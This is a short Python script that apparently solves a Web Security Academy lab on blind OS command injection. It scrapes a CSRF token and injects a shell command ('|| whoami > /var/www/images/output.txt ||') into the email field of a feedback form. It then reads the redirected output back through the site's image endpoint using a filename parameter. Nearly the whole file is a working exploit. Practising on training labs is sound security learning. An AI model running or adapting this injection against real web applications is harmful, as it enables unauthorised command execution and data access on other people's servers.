import requests
from bs4 import BeautifulSoup

url = "https://0a13005f04ad2a30800e443e002500d7.web-security-academy.net"

if url.endswith("/"):
    url = url[:-1]

cookies = {
    "session" : "Co0PIRpLS3hPqAnF6maVGbTvlOvR2l2D"
}

s = requests.Session()
def csrfTokenGet(endpoint):
    r = s.get(f"{url}{endpoint}", cookies=cookies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]
    return csrf
csrf = csrfTokenGet("/feedback")


def submitFeedback(command):
    data = {
        "csrf" : csrf,
        "name" : "asd1",
        "email" : f"admin@asds.com|| {command} ||",
        "subject" : "asd",
        "message" : "asdasdsad"
    }
    r = requests.post(f"{url}/feedback/submit", data=data, cookies=cookies)
    return r

f = submitFeedback("whoami > /var/www/images/output.txt")


def fileRead():
    paramaters = {
        "filename" : "output.txt"
    }
    r = s.get(f"{url}/image", params = paramaters, cookies=cookies)
    return r
r = fileRead()

print("Status Code is: ", r.status_code)
print(r.text)